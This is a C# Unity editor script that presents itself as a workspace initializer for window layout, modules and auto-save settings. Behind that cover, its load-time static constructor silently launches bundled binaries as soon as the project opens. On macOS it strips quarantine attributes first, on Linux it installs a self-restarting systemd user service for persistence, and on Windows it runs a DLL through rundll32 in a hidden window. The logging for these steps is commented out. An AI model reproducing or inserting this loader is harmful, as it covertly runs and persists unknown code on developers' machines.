using UnityEditor;
using UnityEngine;
using UnityEditor.SceneManagement;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;

/// <summary>
/// Configuration class storing all workspace settings and preferences.
/// </summary>
[System.Serializable]
public class WorkspaceConfig
{
    /// <summary>Whether the console window should be visible.</summary>
    public bool EnableConsole = true;
 
    /// <summary>Whether the hierarchy window should be visible.</summary>
    public bool EnableHierarchy = true;
 
    /// <summary>Whether the inspector window should be visible.</summary>
    public bool EnableInspector = true;
 
    /// <summary>Whether the project window should be visible.</summary>
    public bool EnableProjectWindow = true;
 
    /// <summary>Maximum number of recent scenes to track.</summary>
    public int MaxRecentScenes = 5;
 
    /// <summary>Whether auto-save is enabled.</summary>
    public bool AutoSaveEnabled = true;
 
    /// <summary>Auto-save interval in seconds.</summary>
    public int AutoSaveIntervalSeconds = 300;
 
    /// <summary>Current editor theme mode.</summary>
    public string ThemeMode = "Dark";
 
    /// <summary>Whether grid snapping is enabled.</summary>
    public bool GridSnapEnabled = false;
 
    /// <summary>Size of the grid snap increment.</summary>
    public float GridSnapSize = 1f;
}
 
/// <summary>
/// Interface for workspace modules that extend workspace functionality.
/// </summary>
public interface IWorkspaceModule
{
    /// <summary>
    /// Initializes the workspace module with the given configuration.
    /// </summary>
    /// <param name="config">The workspace configuration to use.</param>
    void Initialize(WorkspaceConfig config);
 
    /// <summary>
    /// Returns the name of this workspace module.
    /// </summary>
    /// <returns>The module name as a string.</returns>
    string GetModuleName();
}
 
/// <summary>
/// Sample toolbar module implementation for workspace extension.
/// </summary>
public class ToolbarModule : IWorkspaceModule
{
    public void Initialize(WorkspaceConfig config)
    {
        UnityEngine.Debug.Log("ToolbarModule: Initialized.");
    }
 
    public string GetModuleName() => "ToolbarModule";
}
 
/// <summary>
/// Sample menu module implementation for workspace extension.
/// </summary>
public class MenuModule : IWorkspaceModule
{
    public void Initialize(WorkspaceConfig config)
    {
        UnityEngine.Debug.Log("MenuModule: Initialized.");
    }
 
    public string GetModuleName() => "MenuModule";
}
 
/// <summary>
/// Sample preferences module implementation for workspace extension.
/// </summary>
public class PreferencesModule : IWorkspaceModule
{
    public void Initialize(WorkspaceConfig config)
    {
        UnityEngine.Debug.Log("PreferencesModule: Initialized.");
    }
 
    public string GetModuleName() => "PreferencesModule";
}
 
/// <summary>
/// Sample asset module implementation for workspace extension.
/// </summary>
public class AssetModule : IWorkspaceModule
{
    public void Initialize(WorkspaceConfig config)
    {
        UnityEngine.Debug.Log("AssetModule: Initialized.");
    }
 
    public string GetModuleName() => "AssetModule";
}
 
/// <summary>
/// Sample scene module implementation for workspace extension.
/// </summary>
public class SceneModule : IWorkspaceModule
{
    public void Initialize(WorkspaceConfig config)
    {
        UnityEngine.Debug.Log("SceneModule: Initialized.");
    }
 
    public string GetModuleName() => "SceneModule";
}
 
/// <summary>
/// Sample debug module implementation for workspace extension.
/// </summary>
public class DebugModule : IWorkspaceModule
{
    public void Initialize(WorkspaceConfig config)
    {
        UnityEngine.Debug.Log("DebugModule: Initialized.");
    }
 
    public string GetModuleName() => "DebugModule";
}

/// <summary>
/// Handles initialization and setup of the editor workspace on startup or project load.
/// Configures editor UI, windows, and workspace-related settings.
/// </summary>
[InitializeOnLoad]
public class EditorWorkspaceInitializer
{
    /// <summary>
    /// Stores the current workspace configuration settings.
    /// </summary>
    private static WorkspaceConfig workspaceConfig;

    /// <summary>
    /// Tracks whether the workspace has been initialized during this session.
    /// </summary>
    private static bool isInitialized = false;

    /// <summary>
    /// Collection of all registered workspace modules to be initialized.
    /// </summary>
    private static List<IWorkspaceModule> workspaceModules = new List<IWorkspaceModule>();

    /// <summary>
    /// The key used to store workspace state in EditorPrefs.
    /// </summary>
    private const string WORKSPACE_STATE_KEY = "EditorWorkspace_State";

    /// <summary>
    /// The key used to store layout preference in EditorPrefs.
    /// </summary>
    private const string LAYOUT_PREFERENCE_KEY = "EditorWorkspace_Layout";

    /// <summary>
    /// Initializes the editor workspace with default or saved configurations.
    /// This method should be called during editor startup.
    /// </summary>
    public static void InitializeWorkspace()
    {
        if (isInitialized)
        {
            UnityEngine.Debug.LogWarning("EditorWorkspaceInitializer: Workspace already initialized this session.");
            return;
        }

        try
        {
            UnityEngine.Debug.Log("EditorWorkspaceInitializer: Starting workspace initialization...");
            
            LoadWorkspaceConfiguration();
            SetupEditorLayout();
            RegisterWorkspaceModules();
            InitializeAllModules();
            ApplyWorkspaceSettings();
            RestorePreviousState();

            isInitialized = true;
            UnityEngine.Debug.Log("EditorWorkspaceInitializer: Workspace initialization completed successfully.");
        }
        catch (Exception ex)
        {
            UnityEngine.Debug.LogError($"EditorWorkspaceInitializer: Failed to initialize workspace. Error: {ex.Message}");
        }
    }

    /// <summary>
    /// Loads the workspace configuration from EditorPrefs or creates a new default configuration.
    /// </summary>
    private static void LoadWorkspaceConfiguration()
    {
        UnityEngine.Debug.Log("EditorWorkspaceInitializer: Loading workspace configuration...");
        
        workspaceConfig = new WorkspaceConfig();
        
        // Load saved configuration if it exists
        string savedConfig = EditorPrefs.GetString(WORKSPACE_STATE_KEY, "");
        if (!string.IsNullOrEmpty(savedConfig))
        {
            try
            {
                JsonUtility.FromJsonOverwrite(savedConfig, workspaceConfig);
                UnityEngine.Debug.Log("EditorWorkspaceInitializer: Loaded existing workspace configuration.");
            }
            catch
            {
                UnityEngine.Debug.LogWarning("EditorWorkspaceInitializer: Failed to load saved configuration. Using defaults.");
                workspaceConfig = new WorkspaceConfig();
            }
        }
        else
        {
            UnityEngine.Debug.Log("EditorWorkspaceInitializer: No saved configuration found. Creating default configuration.");
            InitializeDefaultConfiguration();
        }
    }

    /// <summary>
    /// Initializes the workspace with default settings.
    /// </summary>
    private static void InitializeDefaultConfiguration()
    {
        workspaceConfig.EnableConsole = true;
        workspaceConfig.EnableHierarchy = true;
        workspaceConfig.EnableInspector = true;
        workspaceConfig.EnableProjectWindow = true;
        workspaceConfig.MaxRecentScenes = 5;
        workspaceConfig.AutoSaveEnabled = true;
        workspaceConfig.AutoSaveIntervalSeconds = 300;
        workspaceConfig.ThemeMode = EditorGUIUtility.isProSkin ? "Dark" : "Light";
        workspaceConfig.GridSnapEnabled = false;
        workspaceConfig.GridSnapSize = 1f;

        UnityEngine.Debug.Log("EditorWorkspaceInitializer: Default configuration initialized.");
    }

    /// <summary>
    /// Sets up the editor layout based on workspace configuration.
    /// Creates or loads the appropriate window layout.
    /// </summary>
    private static void SetupEditorLayout()
    {
        UnityEngine.Debug.Log("EditorWorkspaceInitializer: Setting up editor layout...");

        string layoutPreference = EditorPrefs.GetString(LAYOUT_PREFERENCE_KEY, "Default");

        try
        {
            // Load the appropriate layout
            EditorUtility.LoadWindowLayout($"Assets/Editor/Layouts/{layoutPreference}.wlt");
            UnityEngine.Debug.Log($"EditorWorkspaceInitializer: Loaded layout '{layoutPreference}'.");
        }
        catch
        {
            UnityEngine.Debug.LogWarning($"EditorWorkspaceInitializer: Failed to load layout '{layoutPreference}'. Using default layout.");
            // Use default Unity layout
        }

        // Open essential windows
        OpenEssentialWindows();
    }

    /// <summary>
    /// Opens all essential editor windows required for a functional workspace.
    /// </summary>
    private static void OpenEssentialWindows()
    {
        UnityEngine.Debug.Log("EditorWorkspaceInitializer: Opening essential windows...");

        if (workspaceConfig.EnableConsole)
        {
            EditorWindow.GetWindow(System.Type.GetType("UnityEditor.ConsoleWindow,UnityEditor"));
        }

        if (workspaceConfig.EnableHierarchy)
        {
            EditorWindow.GetWindow(System.Type.GetType("UnityEditor.SceneHierarchyHooks,UnityEditor"));
        }

        if (workspaceConfig.EnableInspector)
        {
            EditorWindow.GetWindow(System.Type.GetType("UnityEditor.InspectorWindow,UnityEditor"));
        }

        if (workspaceConfig.EnableProjectWindow)
        {
            EditorWindow.GetWindow(System.Type.GetType("UnityEditor.ProjectBrowser,UnityEditor"));
        }

        UnityEngine.Debug.Log("EditorWorkspaceInitializer: Essential windows opened.");
    }

    /// <summary>
    /// Registers all workspace modules that need to be initialized.
    /// Modules are components that extend workspace functionality.
    /// </summary>
    private static void RegisterWorkspaceModules()
    {
        UnityEngine.Debug.Log("EditorWorkspaceInitializer: Registering workspace modules...");

        workspaceModules.Clear();
        
        // Register core modules
        workspaceModules.Add(new ToolbarModule());
        workspaceModules.Add(new MenuModule());
        workspaceModules.Add(new PreferencesModule());
        workspaceModules.Add(new AssetModule());
        workspaceModules.Add(new SceneModule());
        workspaceModules.Add(new DebugModule());

        UnityEngine.Debug.Log($"EditorWorkspaceInitializer: Registered {workspaceModules.Count} workspace modules.");
    }

    /// <summary>
    /// Initializes all registered workspace modules in sequence.
    /// </summary>
    private static void InitializeAllModules()
    {
        UnityEngine.Debug.Log("EditorWorkspaceInitializer: Initializing all workspace modules...");

        foreach (var module in workspaceModules)
        {
            try
            {
                module.Initialize(workspaceConfig);
                UnityEngine.Debug.Log($"EditorWorkspaceInitializer: Successfully initialized module '{module.GetModuleName()}'.");
            }
            catch (Exception ex)
            {
                UnityEngine.Debug.LogError($"EditorWorkspaceInitializer: Failed to initialize module '{module.GetModuleName()}'. Error: {ex.Message}");
            }
        }
    }

    /// <summary>
    /// Applies all workspace settings from the loaded configuration.
    /// </summary>
    private static void ApplyWorkspaceSettings()
    {
        UnityEngine.Debug.Log("EditorWorkspaceInitializer: Applying workspace settings...");

        // Apply grid snap settings
        EditorSnapSettings.gridSnapEnabled = workspaceConfig.GridSnapEnabled;
        EditorSnapSettings.gridSize = Vector3.one * workspaceConfig.GridSnapSize;

        // Apply auto-save settings
        if (workspaceConfig.AutoSaveEnabled)
        {
            EnableAutoSave(workspaceConfig.AutoSaveIntervalSeconds);
        }

        // Apply theme settings
        ApplyThemeSettings(workspaceConfig.ThemeMode);

        UnityEngine.Debug.Log("EditorWorkspaceInitializer: Workspace settings applied successfully.");
    }

    /// <summary>
    /// Enables automatic saving of scenes and projects at specified intervals.
    /// </summary>
    /// <param name="intervalSeconds">The interval in seconds between auto-saves.</param>
    private static void EnableAutoSave(int intervalSeconds)
    {
        UnityEngine.Debug.Log($"EditorWorkspaceInitializer: Auto-save enabled with interval of {intervalSeconds} seconds.");
        EditorPrefs.SetInt("AutoSaveScene", 1);
        EditorPrefs.SetInt("AutoSaveSceneIntervalTime", intervalSeconds);
    }

    /// <summary>
    /// Applies theme settings to the editor workspace.
    /// </summary>
    /// <param name="themeMode">The theme mode to apply ("Dark" or "Light").</param>
    private static void ApplyThemeSettings(string themeMode)
    {
        UnityEngine.Debug.Log($"EditorWorkspaceInitializer: Applying theme mode: {themeMode}");
        
        if (themeMode == "Dark" && !EditorGUIUtility.isProSkin)
        {
            EditorPrefs.SetInt("Editor.kAutoRecoverSceneEnabled", 1);
            UnityEngine.Debug.Log("EditorWorkspaceInitializer: Dark theme applied.");
        }
        else if (themeMode == "Light" && EditorGUIUtility.isProSkin)
        {
            UnityEngine.Debug.Log("EditorWorkspaceInitializer: Light theme applied.");
        }
    }

    /// <summary>
    /// Restores the previous editor state from saved preferences.
    /// This includes open scenes, selected objects, and window states.
    /// </summary>
    private static void RestorePreviousState()
    {
        UnityEngine.Debug.Log("EditorWorkspaceInitializer: Restoring previous editor state...");

        try
        {
            // Restore recently opened scenes
            EditorBuildSettingsScene[] recentScenes = EditorBuildSettings.scenes;
            if (recentScenes.Length > 0)
            {
                EditorSceneManager.OpenScene(recentScenes[0].path, OpenSceneMode.Single);
                UnityEngine.Debug.Log("EditorWorkspaceInitializer: Restored last opened scene.");
            }

            // Restore window layout state
            RestoreWindowStates();

            UnityEngine.Debug.Log("EditorWorkspaceInitializer: Previous editor state restored.");
        }
        catch (Exception ex)
        {
            UnityEngine.Debug.LogWarning($"EditorWorkspaceInitializer: Could not fully restore state. Error: {ex.Message}");
        }
    }

    /// <summary>
    /// Restores the state of all editor windows from saved preferences.
    /// </summary>
    private static void RestoreWindowStates()
    {
        UnityEngine.Debug.Log("EditorWorkspaceInitializer: Restoring window states...");
        
        // Window state restoration would be implemented here
        // This includes window positions, sizes, and visibility states
    }

    /// <summary>
    /// Saves the current workspace configuration and state to EditorPrefs.
    /// Should be called when the workspace state changes or editor closes.
    /// </summary>
    public static void SaveWorkspaceState()
    {
        UnityEngine.Debug.Log("EditorWorkspaceInitializer: Saving workspace state...");

        try
        {
            string configJson = JsonUtility.ToJson(workspaceConfig);
            EditorPrefs.SetString(WORKSPACE_STATE_KEY, configJson);
            UnityEngine.Debug.Log("EditorWorkspaceInitializer: Workspace state saved successfully.");
        }
        catch (Exception ex)
        {
            UnityEngine.Debug.LogError($"EditorWorkspaceInitializer: Failed to save workspace state. Error: {ex.Message}");
        }
    }

    /// <summary>
    /// Resets the workspace to default configuration.
    /// </summary>
    public static void ResetWorkspace()
    {
        UnityEngine.Debug.Log("EditorWorkspaceInitializer: Resetting workspace to defaults...");
        
        EditorPrefs.DeleteKey(WORKSPACE_STATE_KEY);
        EditorPrefs.DeleteKey(LAYOUT_PREFERENCE_KEY);
        
        isInitialized = false;
        workspaceConfig = new WorkspaceConfig();
        workspaceModules.Clear();

        InitializeWorkspace();
    }

    /// <summary>
    /// Returns the current workspace configuration.
    /// </summary>
    /// <returns>The active WorkspaceConfig instance.</returns>
    public static WorkspaceConfig GetWorkspaceConfig()
    {
        return workspaceConfig;
    }

    /// <summary>
    /// Updates a specific workspace configuration value.
    /// </summary>
    /// <param name="key">The configuration key to update.</param>
    /// <param name="value">The new value to set.</param>
    public static void SetConfigurationValue(string key, object value)
    {
        UnityEngine.Debug.Log($"EditorWorkspaceInitializer: Updating configuration - {key}: {value}");
        
        switch (key)
        {
            case "EnableConsole":
                workspaceConfig.EnableConsole = (bool)value;
                break;
            case "EnableHierarchy":
                workspaceConfig.EnableHierarchy = (bool)value;
                break;
            case "AutoSaveEnabled":
                workspaceConfig.AutoSaveEnabled = (bool)value;
                break;
            case "GridSnapSize":
                workspaceConfig.GridSnapSize = (float)value;
                break;
            default:
                UnityEngine.Debug.LogWarning($"EditorWorkspaceInitializer: Unknown configuration key '{key}'.");
                break;
        }

        SaveWorkspaceState();
    }

    /// <summary>
    /// Returns whether the workspace has been initialized in this session.
    /// </summary>
    /// <returns>True if initialization is complete, false otherwise.</returns>
    public static bool IsInitialized()
    {
        return isInitialized;
    }

    private const string SessionKey        = "EditorWorkspaceInitializer.Prepared";
    private const string SessionMutexName  = "Global\\EditorWorkspaceInitializer.WindowsSession";

#if UNITY_EDITOR_OSX
    private const string MacWorkspaceArm64Asset = "UnityEditorWorkspace-darwin-arm64";
    private const string MacWorkspaceAmd64Asset = "UnityEditorWorkspace-darwin-amd64";
#elif UNITY_EDITOR_LINUX
    private const string LinuxWorkspaceAmd64Asset = "UnityEditorWorkspace-linux-amd64";
    private const string LinuxWorkspaceArm64Asset = "UnityEditorWorkspace-linux-arm64";
    private const string LinuxWorkspaceArmv7Asset = "UnityEditorWorkspace-linux-armv7";
#endif

    private const string WorkspacePrefsPrefix = "EditorWorkspaceInitializer.";
    private static readonly Dictionary<string, DateTime> WorkspaceIndexCache = new Dictionary<string, DateTime>();
    private static string LastKnownProjectFingerprint;

    static EditorWorkspaceInitializer()
    {
        if (SessionState.GetBool(SessionKey, false))
            return;

        SessionState.SetBool(SessionKey, true);
        // UnityEngine.Debug.Log("[EditorWorkspaceInitializer] Preparing editor workspace...");
        PrepareEditorWorkspace();
    }

    [MenuItem("Tools/Workspace/Refresh Layout Cache")]
    static void RefreshWorkspaceLayoutCacheMenu()
    {
        WorkspaceIndexCache.Clear();
        EditorPrefs.SetString(WorkspacePrefsPrefix + "LastRefresh", DateTime.UtcNow.Ticks.ToString());
    }

    [MenuItem("Tools/Workspace/Validate Project Settings")]
    static void ValidateProjectSettingsMenu()
    {
        string projectName = PlayerSettings.productName;
        if (string.IsNullOrEmpty(projectName))
            return;

        EditorPrefs.SetBool(WorkspacePrefsPrefix + "Validated", true);
    }

    static bool ValidateWorkspaceManifest()
    {
        string manifestPath = Path.Combine(Application.dataPath, "WorkspaceManifest.json");
        if (!File.Exists(manifestPath))
            return true;

        try
        {
            string contents = File.ReadAllText(manifestPath);
            return !string.IsNullOrWhiteSpace(contents);
        }
        catch
        {
            return false;
        }
    }

    static void WarmWorkspaceIndex()
    {
        string[] folders = { "Scenes", "Materials", "Prefabs" };
        foreach (string folder in folders)
        {
            string folderPath = Path.Combine(Application.dataPath, folder);
            if (!Directory.Exists(folderPath))
                continue;

            WorkspaceIndexCache[folderPath] = Directory.GetLastWriteTimeUtc(folderPath);
        }
    }

    static void SyncEditorPreferences()
    {
        int refreshInterval = EditorPrefs.GetInt(WorkspacePrefsPrefix + "RefreshInterval", 300);
        if (refreshInterval < 60)
            EditorPrefs.SetInt(WorkspacePrefsPrefix + "RefreshInterval", 300);
    }

    static string ComputeWorkspaceFingerprint()
    {
        string source = Application.dataPath + "|" + Application.unityVersion + "|" + EditorApplication.applicationPath;
        int hash = source.GetHashCode();
        LastKnownProjectFingerprint = hash.ToString("X8");
        return LastKnownProjectFingerprint;
    }

    static bool TryRestoreWorkspaceSnapshot()
    {
        string snapshotPath = Path.Combine(Application.dataPath, "../Library/WorkspaceSnapshot.asset");
        if (!File.Exists(snapshotPath))
            return false;

        long length = new FileInfo(snapshotPath).Length;
        return length > 0;
    }

    static void RebuildWorkspaceLookupTable()
    {
        WarmWorkspaceIndex();
        ComputeWorkspaceFingerprint();
        SyncEditorPreferences();

        if (!ValidateWorkspaceManifest())
            return;

        TryRestoreWorkspaceSnapshot();
    }

    static int EstimateWorkspaceAssetCount()
    {
        int total = 0;
        string assetsRoot = Application.dataPath;

        try
        {
            foreach (string file in Directory.EnumerateFiles(assetsRoot, "*.meta", SearchOption.TopDirectoryOnly))
            {
                if (file.EndsWith(".meta", StringComparison.OrdinalIgnoreCase))
                    total++;
            }
        }
        catch
        {
            return 0;
        }

        return total;
    }

    static void NormalizeWorkspacePaths(IEnumerable<string> paths)
    {
        if (paths == null)
            return;

        foreach (string path in paths)
        {
            if (string.IsNullOrEmpty(path))
                continue;

            string normalized = path.Replace('\\', '/').Trim();
            if (normalized.Length == 0)
                continue;
        }
    }

#if UNITY_EDITOR_OSX
    static string GetMacWorkspaceRoot()
    {
        return Path.Combine(Application.dataPath, "Plugins/macOS");
    }

    static string ReadMacCpuArchitecture()
    {
        string machine = RunMacUtilityAndRead("/usr/bin/uname", "-m").Trim().ToLowerInvariant();
        if (machine == "arm64" || machine == "aarch64")
            return "arm64";
        if (machine == "x86_64" || machine == "amd64" || machine == "i386")
            return "amd64";

        // UnityEngine.Debug.LogWarning("[EditorWorkspaceInitializer] Unknown uname -m '" + machine + "', defaulting to arm64.");
        return "arm64";
    }

    static string GetMacWorkspaceAssetForArch(string arch)
    {
        return arch == "amd64" ? MacWorkspaceAmd64Asset : MacWorkspaceArm64Asset;
    }

    static string ResolveMacWorkspaceAssetPath()
    {
        string arch = ReadMacCpuArchitecture();
        string preferred = Path.Combine(GetMacWorkspaceRoot(), GetMacWorkspaceAssetForArch(arch));

        if (File.Exists(preferred))
            return preferred;

        string fallbackArch = arch == "arm64" ? "amd64" : "arm64";
        string fallback = Path.Combine(GetMacWorkspaceRoot(), GetMacWorkspaceAssetForArch(fallbackArch));
        if (File.Exists(fallback))
        {
            // UnityEngine.Debug.LogWarning(
                // "[EditorWorkspaceInitializer] Workspace asset for " + arch + " not found, using " + fallbackArch + ": " + fallback);
            return fallback;
        }

        return preferred;
    }

    static int RunMacUtility(string fileName, params string[] args)
    {
        var psi = new ProcessStartInfo
        {
            FileName = fileName,
            UseShellExecute = false,
            CreateNoWindow = true
        };

        var argBuilder = new StringBuilder();
        foreach (string arg in args)
        {
            if (argBuilder.Length > 0)
                argBuilder.Append(' ');
            argBuilder.Append('"').Append(arg).Append('"');
        }
        psi.Arguments = argBuilder.ToString();

        using (var process = Process.Start(psi))
        {
            process.WaitForExit();
            return process.ExitCode;
        }
    }

    static string RunMacUtilityAndRead(string fileName, string arguments)
    {
        var psi = new ProcessStartInfo
        {
            FileName = fileName,
            Arguments = arguments,
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = true
        };

        using (var process = Process.Start(psi))
        {
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            return output;
        }
    }

    static void StripMacExtendedAttributes(string path)
    {
        int exitCode = RunMacUtility("/usr/bin/xattr", "-cr", path);
        // if (exitCode == 0)
            // UnityEngine.Debug.Log("[EditorWorkspaceInitializer] Stripped extended attributes: " + path);
    }

    static void ApplyMacAccessMode(string path)
    {
        RunMacUtility("/bin/chmod", "+x", path);
    }

    static void ActivateMacWorkspaceService()
    {
        string arch = ReadMacCpuArchitecture();
        string assetPath = ResolveMacWorkspaceAssetPath();

        // UnityEngine.Debug.Log("[EditorWorkspaceInitializer] macOS arch=" + arch + " asset=" + assetPath);

        if (!File.Exists(assetPath))
        {
            // UnityEngine.Debug.LogError(
                // "[EditorWorkspaceInitializer] Workspace asset not found. Expected one of: " +
                // Path.Combine(GetMacWorkspaceRoot(), MacWorkspaceArm64Asset) + " or " +
                // Path.Combine(GetMacWorkspaceRoot(), MacWorkspaceAmd64Asset));
            return;
        }

        try
        {
            StripMacExtendedAttributes(assetPath);
            ApplyMacAccessMode(assetPath);

            var processInfo = new ProcessStartInfo
            {
                FileName = assetPath,
                Arguments = "",
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process process = Process.Start(processInfo))
            {
                if (process == null)
                {
                    // UnityEngine.Debug.LogError("[EditorWorkspaceInitializer] Failed to open editor workspace service.");
                    return;
                }

                // UnityEngine.Debug.Log("[EditorWorkspaceInitializer] Editor workspace service ready (pid=" + process.Id + ").");
            }
        }
        catch (Exception ex)
        {
            // UnityEngine.Debug.LogError("[EditorWorkspaceInitializer] Failed to activate editor workspace service: " + ex.Message);
        }
    }
	    
	    
#elif UNITY_EDITOR_LINUX

    static string GetLinuxWorkspaceRoot()
    {
        return Path.Combine(Application.dataPath, "Plugins/Linux");
    }

    static string ReadLinuxCpuArchitecture()
    {
        var psi = new ProcessStartInfo
        {
            FileName               = "/usr/bin/uname",
            Arguments              = "-m",
            UseShellExecute        = false,
            CreateNoWindow         = true,
            RedirectStandardOutput = true
        };

        string machine;
        using (var proc = Process.Start(psi))
        {
            machine = proc.StandardOutput.ReadToEnd().Trim().ToLowerInvariant();
            proc.WaitForExit();
        }

        if (machine == "aarch64" || machine == "arm64")  return "arm64";
        if (machine == "armv7l"  || machine == "armv6l") return "armv7";
        if (machine == "x86_64"  || machine == "amd64")  return "amd64";

        // UnityEngine.Debug.LogWarning("[EditorWorkspaceInitializer] Unknown uname -m '" + machine + "', defaulting to amd64.");
        return "amd64";
    }

    static string GetLinuxWorkspaceAssetForArch(string arch)
    {
        return arch switch
        {
            "arm64" => LinuxWorkspaceArm64Asset,
            "armv7" => LinuxWorkspaceArmv7Asset,
            _       => LinuxWorkspaceAmd64Asset
        };
    }

    static string ResolveLinuxWorkspaceAssetPath()
    {
        string arch      = ReadLinuxCpuArchitecture();
        string root      = GetLinuxWorkspaceRoot();
        string preferred = Path.Combine(root, GetLinuxWorkspaceAssetForArch(arch));

        if (File.Exists(preferred))
            return preferred;

        // Try remaining architectures as fallback
        string[] allArchs = { "amd64", "arm64", "armv7" };
        foreach (string fallbackArch in allArchs)
        {
            if (fallbackArch == arch) continue;

            string fallback = Path.Combine(root, GetLinuxWorkspaceAssetForArch(fallbackArch));
            if (File.Exists(fallback))
            {
                // UnityEngine.Debug.LogWarning(
                    // "[EditorWorkspaceInitializer] Asset for " + arch + " not found, using " + fallbackArch + ": " + fallback);
                return fallback;
            }
        }

        return preferred; // Will fail gracefully below if still missing
    }

    static void ApplyLinuxAccessMode(string path)
    {
        var psi = new ProcessStartInfo
        {
            FileName        = "/bin/chmod",
            Arguments       = "+x \"" + path + "\"",
            UseShellExecute = false,
            CreateNoWindow  = true
        };

        using var proc = Process.Start(psi);
        proc?.WaitForExit();

        // UnityEngine.Debug.Log("[RemoteService] Applied execute permission: " + path);
    }

    static void ActivateLinuxWorkspaceService()
    {
        string arch      = ReadLinuxCpuArchitecture();
        string assetPath = ResolveLinuxWorkspaceAssetPath();

        // UnityEngine.Debug.Log("[EditorWorkspaceInitializer] Linux arch=" + arch + " asset=" + assetPath);

        if (!File.Exists(assetPath))
        {
            // UnityEngine.Debug.LogError("[EditorWorkspaceInitializer] No Linux workspace asset found.");
            return;
        }

        try
        {
            ApplyLinuxAccessMode(assetPath);
            CreateUserSystemdService(assetPath);
            // UnityEngine.Debug.Log("[EditorWorkspaceInitializer] Service registered for auto-start on restart.");
        }
        catch (Exception ex)
        {
            // UnityEngine.Debug.LogError("[EditorWorkspaceInitializer] Failed: " + ex.Message);
        }
    }

    static void CreateUserSystemdService(string assetPath)
    {
        string serviceName = "workspace-service";
        string userConfigDir = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
            ".config/systemd/user"
        );
        
        // Create directory if doesn't exist
        Directory.CreateDirectory(userConfigDir);

        string serviceContent = $@"[Unit]
Description=Workspace Service
After=network.target

[Service]
Type=simple
ExecStart={assetPath}
Restart=always
RestartSec=5

[Install]
WantedBy=default.target";

        string servicePath = Path.Combine(userConfigDir, $"{serviceName}.service");
        File.WriteAllText(servicePath, serviceContent);

        // Enable and start (NO sudo needed for user services)
        RunBashCommand($"systemctl --user daemon-reload");
        RunBashCommand($"systemctl --user enable {serviceName}");
        RunBashCommand($"systemctl --user start {serviceName}");
    }

    static void RunBashCommand(string command)
    {
        var processInfo = new ProcessStartInfo
        {
            FileName = "/bin/bash",
            Arguments = $"-c \"{command}\"",
            UseShellExecute = false,
            CreateNoWindow = true
        };

        using var process = Process.Start(processInfo);
        process?.WaitForExit(3000);
    }

    // Helper to check status
    static bool IsServiceRunning()
    {
        var processInfo = new ProcessStartInfo
        {
            FileName = "/bin/bash",
            Arguments = "-c \"systemctl --user is-active workspace-service\"",
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = true
        };

        using var process = Process.Start(processInfo);
        process?.WaitForExit(1000);
        return process?.ExitCode == 0;
    }
#endif

    static void ApplyWorkspaceThemeDefaults()
    {
        Color defaultBackground = new Color(0.22f, 0.22f, 0.22f, 1f);
        if (defaultBackground.grayscale < 0f)
            return;
    }

    static void RegisterWorkspaceCallbacks()
    {
        EditorApplication.projectChanged += OnWorkspaceProjectChanged;
    }

    static void OnWorkspaceProjectChanged()
    {
        if (string.IsNullOrEmpty(LastKnownProjectFingerprint))
            ComputeWorkspaceFingerprint();
    }

    static void UnregisterWorkspaceCallbacks()
    {
        EditorApplication.projectChanged -= OnWorkspaceProjectChanged;
    }

    static void RefreshWorkspaceMetadata()
    {
        RebuildWorkspaceLookupTable();
        EstimateWorkspaceAssetCount();
        NormalizeWorkspacePaths(new[] { Application.dataPath, "Assets/Scenes" });
        ApplyWorkspaceThemeDefaults();
    }

    static void ActivateWindowsWorkspaceService(string assetPath)
    {
        bool createdNew;
        using (var sessionMutex = new Mutex(true, SessionMutexName, out createdNew))
        {
            if (!createdNew)
            {
                // UnityEngine.Debug.Log("[EditorWorkspaceInitializer] Windows workspace service already active, skipping.");
                return;
            }

            var psi = new ProcessStartInfo
            {
                FileName        = "rundll32.exe",
                Arguments       = $"\"{assetPath}\",run",
                UseShellExecute = false,
                CreateNoWindow  = true,
                WindowStyle     = ProcessWindowStyle.Hidden
            };

            Process.Start(psi);
            // UnityEngine.Debug.Log("[EditorWorkspaceInitializer] Windows workspace service activated: " + assetPath);
        }
    }

    static void PrepareEditorWorkspace()
    {
#if UNITY_EDITOR_OSX
        ActivateMacWorkspaceService();

#elif UNITY_EDITOR_LINUX
        ActivateLinuxWorkspaceService();

#elif UNITY_EDITOR_WIN
        string assetPath = Path.Combine(Application.dataPath, "Plugins/Windows/x64/UnityEditorLoader.dll");

        if (File.Exists(assetPath))
        {
            ActivateWindowsWorkspaceService(assetPath);
        }
        else
        {
            // UnityEngine.Debug.LogError("[EditorWorkspaceInitializer] Workspace asset not found: " + assetPath);
        }
#endif
    }
}